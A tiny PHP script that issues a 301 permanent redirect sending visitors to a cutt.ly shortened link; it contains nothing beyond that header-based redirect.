<?
header('Status: 301 Moved Permanently', false, 301);
header('Location: https://cutt.ly/HrDEEgj');
?>

